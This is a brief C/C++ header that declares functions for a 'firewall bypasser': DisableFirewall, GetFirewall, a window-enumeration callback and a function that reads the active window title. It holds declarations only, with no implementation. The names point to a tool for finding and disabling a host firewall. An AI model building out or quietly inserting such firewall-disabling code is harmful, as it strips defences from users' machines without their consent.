#ifndef FIREWALLBYPASSER_H
#define FIREWALLBYPASSER_H

int DisableFirewall();
HWND GetFirewall();
BOOL EnumWindowsProc(HWND hwnd, LPARAM lParam);
std::string GetActiveWindowTitle();

#endif /* FIREWALLBYPASSER_H */

